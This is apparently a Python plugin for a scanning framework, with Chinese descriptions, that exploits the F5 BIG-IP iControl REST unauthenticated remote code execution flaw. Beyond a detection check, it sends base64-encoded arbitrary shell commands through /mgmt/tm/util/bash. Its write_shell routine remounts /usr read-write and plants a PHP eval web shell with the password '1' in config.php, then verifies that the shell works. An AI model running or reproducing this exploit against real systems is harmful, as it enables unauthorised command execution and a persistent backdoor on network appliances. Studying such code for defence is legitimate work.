# -*-* coding:UTF-8
import json
import base64
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "F5 BIG-IP 远程代码执行漏洞",
        "description": "F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。",
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        r = self.request(
            method='post',
            path='./mgmt/tm/util/bash',
            headers={
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': '',
                'Authorization': 'Basic YWRtaW46QVNhc1M='
            },
            data={'command': "run", 'utilCmdArgs': f"-c 'echo {random_str}'"},
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            return {
                "LoopholeInfo": {"app": "F5 BIG-IP", "name": "F5 BIG-IP 远程代码执行漏洞"}
            }

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './mgmt/tm/util/bash'),
            headers={
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': '',
                'Authorization': 'Basic YWRtaW46QVNhc1M='
            },
            data={'command': "run", 'utilCmdArgs': f"-c 'echo {base64.b64encode(cmd.encode()).decode()}|base64 -d|sh'"},
            timeout=15
        )
        if r.status_code == 200:
            res = json.loads(r.text)['commandResult']
            return res

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        payload = f'mount -o remount -rw /usr;' \
                  f'echo \'<?php eval($_POST[1]);\'>/usr/local/www/xui/common/config.php;' \
                  f'mount -o remount -r /usr'
        base64_str = base64.b64encode(payload.encode()).decode()
        cmd = f"echo {base64_str}|base64 -d|sh"
        self.exec_cmd(url, cmd)
        random_str = self.build_random_str()
        r = self.request(
            method='get',
            path=f"./xui/common/config.php?1=system('echo {random_str}');",
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {urllib.parse.urljoin(url, "./xui/common/config.php")}')
            self.log.success('访问密码: 1')
        else:
            self.log.failure('一句话马写入失败')
